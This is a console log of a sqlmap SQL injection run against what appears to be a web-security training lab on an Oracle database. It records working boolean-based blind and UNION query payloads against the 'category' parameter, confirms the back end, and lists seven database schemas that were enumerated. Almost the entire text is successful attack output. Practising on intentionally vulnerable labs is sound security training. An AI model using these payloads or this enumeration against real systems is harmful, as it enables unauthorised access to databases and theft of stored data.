        ___
       __H__
 ___ ___[']_____ ___ ___  {1.7.11#stable}
|_ -| . [.]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 12:22:53 /2024-09-21/

[12:22:53] [INFO] resuming back-end DBMS 'oracle' 
[12:22:53] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('session=QQYAcD42q5Y...5T9lRSbqMM'). Do you want to use those [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: category (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: category=Gifts' AND 2854=2854 AND 'iEge'='iEge

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: category=Gifts' UNION ALL SELECT CHR(113)||CHR(118)||CHR(107)||CHR(120)||CHR(113)||CHR(107)||CHR(120)||CHR(72)||CHR(101)||CHR(120)||CHR(103)||CHR(122)||CHR(98)||CHR(74)||CHR(118)||CHR(66)||CHR(112)||CHR(90)||CHR(65)||CHR(116)||CHR(75)||CHR(65)||CHR(114)||CHR(68)||CHR(72)||CHR(78)||CHR(82)||CHR(67)||CHR(104)||CHR(109)||CHR(73)||CHR(113)||CHR(120)||CHR(109)||CHR(88)||CHR(90)||CHR(120)||CHR(99)||CHR(113)||CHR(80)||CHR(77)||CHR(86)||CHR(116)||CHR(82)||CHR(65)||CHR(113)||CHR(98)||CHR(122)||CHR(107)||CHR(113),NULL FROM DUAL-- dulj
---
[12:22:54] [INFO] the back-end DBMS is Oracle
back-end DBMS: Oracle
[12:22:54] [WARNING] schema names are going to be used on Oracle for enumeration as the counterpart to database names on other DBMSes
[12:22:54] [INFO] fetching database (schema) names
available databases [7]:
[*] APEX_040000
[*] CTXSYS
[*] MDSYS
[*] PETER
[*] SYS
[*] SYSTEM
[*] XDB

[12:22:54] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 1 times
[12:22:54] [INFO] fetched data logged to text files under '/home/a7med/.local/share/sqlmap/output/0ac400e70452450580fe7b2f002500a8.web-security-academy.net'
[12:22:54] [WARNING] your sqlmap version is outdated

[*] ending @ 12:22:54 /2024-09-21/

